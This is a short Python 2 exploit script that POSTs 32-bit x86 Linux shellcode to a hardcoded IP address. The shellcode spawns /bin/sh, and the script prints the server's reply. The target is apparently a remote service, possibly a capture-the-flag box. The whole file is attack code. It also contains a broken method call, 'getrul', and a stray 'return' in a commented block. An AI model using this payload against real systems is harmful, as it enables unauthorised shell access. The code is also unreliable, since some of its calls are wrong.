import urllib
import urllib2

url = "http://178.128.100.75"

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

data = {"payload" : payload} ## post
data = urllib.urlencode(data)

print(data)

req = urllib2.Request(url, data)
response = urllib2.urlopen(req)

print response.getrul()

the_page = response.read()

print(the_page)
"""
if the_page.find("DONE") != -1:
    return
"""